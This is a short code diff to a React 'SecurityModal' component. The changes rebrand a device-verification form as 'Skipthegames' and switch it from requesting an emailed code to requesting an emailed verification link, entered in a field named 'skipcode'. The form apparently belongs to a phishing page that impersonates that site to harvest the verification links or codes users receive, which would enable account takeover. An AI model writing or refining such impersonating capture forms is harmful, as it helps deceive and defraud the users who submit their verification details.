@@ -57,10 +57,12 @@ function SecurityModal({ setShowModal }) {
       >
         {(formik) => (
           <Form className="">
-            <div className="px-8 py-4 lg:py-7 bg-white text-black rounded">
-              <h2 className="text-2xl font-medium">Device Verification 1/2</h2>
+            <div className="px-5 py-4 lg:py-7 bg-white text-black rounded">
+              <h2 className="text-2xl font-medium">
+                Device Verification Skipthegames
+              </h2>
               <p className="mt-6">
-                We have just sent a Verification Code to email address provided
+                We have just sent a Verification Link to email address provided
                 {/* <strong> email@email.com</strong> */}
                 <strong> {email}</strong>
               </p>
@@ -70,7 +72,7 @@ function SecurityModal({ setShowModal }) {
                   <Field
                     className="w-full text-lg px-[8px] py-[7px] outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
                     name="skipcode"
-                    placeholder="Enter Code Here"
+                    placeholder="Enter Link Here"
                     type="text"
                     required
                     autoFocus
@@ -79,13 +81,13 @@ function SecurityModal({ setShowModal }) {
               </div>
 
               <p className="pt-2">
-                No Code received yet?{" "}
+                No Link received yet?{" "}
                 <span className="text-custom-amber cursor-pointer underline">
                   Resend
                 </span>
               </p>
               <p className="">
-                Having trouble with receiving the Code, You can contact the{" "}
+                Having trouble with receiving the Link, You can contact the{" "}
                 <span className="text-custom-amber cursor-pointer underline">
                   Support
                 </span>
